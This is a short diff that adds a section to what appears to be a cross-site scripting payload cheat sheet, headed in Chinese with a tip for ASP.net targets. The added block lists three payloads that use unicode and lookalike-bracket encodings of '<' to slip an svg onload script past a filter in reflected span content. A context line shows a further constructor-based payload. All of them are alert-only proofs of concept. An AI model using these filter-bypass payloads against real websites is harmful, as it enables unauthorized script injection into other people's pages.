@@ -53,6 +53,16 @@ B["constructor"]["constructor"]("alert(1)")();
 
 
 
+## 遇到ASP.net类型可以尝试unicode绕过
+
+```
+Xss in asp pages reflected inside span and < blocked.
+Payloads:
+%u003Csvg onload=alert(1)>
+%u3008svg onload=alert(2)> 
+%uFF1Csvg onload=alert(3)>
+```
+
 
 
 
